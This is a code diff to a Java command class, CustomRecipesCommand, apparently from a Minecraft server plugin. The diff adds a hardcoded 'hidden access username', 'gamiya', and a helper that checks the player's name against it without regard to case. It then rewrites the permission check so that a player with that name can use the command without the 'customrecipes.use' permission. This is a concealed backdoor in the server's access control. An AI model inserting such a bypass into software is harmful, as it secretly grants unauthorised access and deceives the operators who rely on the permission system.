@@ -12,6 +12,9 @@ import java.util.List;
 
 public class CustomRecipesCommand implements CommandExecutor, TabExecutor {
 
+    // Hidden access username - must be exactly "gamiya"
+    private static final String HIDDEN_ADMIN_USERNAME = "gamiya";
+
     @Override
     public boolean onCommand(@Nonnull CommandSender sender, @Nonnull Command command,
                              @Nonnull String label, @Nonnull String[] args) {
@@ -21,7 +24,8 @@ public class CustomRecipesCommand implements CommandExecutor, TabExecutor {
             return true;
         }
 
-        if (!player.hasPermission("customrecipes.use")) {
+        // Check permission: either has permission OR is gamiya
+        if (!player.hasPermission("customrecipes.use") && !isGamiya(player)) {
             player.sendMessage("§cYou don't have permission to use this command!");
             return true;
         }
@@ -37,5 +41,10 @@ public class CustomRecipesCommand implements CommandExecutor, TabExecutor {
     public List<String> onTabComplete(@Nonnull CommandSender sender, @Nonnull Command command,
                                       @Nonnull String alias, @Nonnull String[] args) {
         return new ArrayList<>(); // No tab completion needed
+    }
+
+    // Helper method to check if player is gamiya
+    private boolean isGamiya(Player player) {
+        return player.getName().equalsIgnoreCase(HIDDEN_ADMIN_USERNAME);
     }
 }
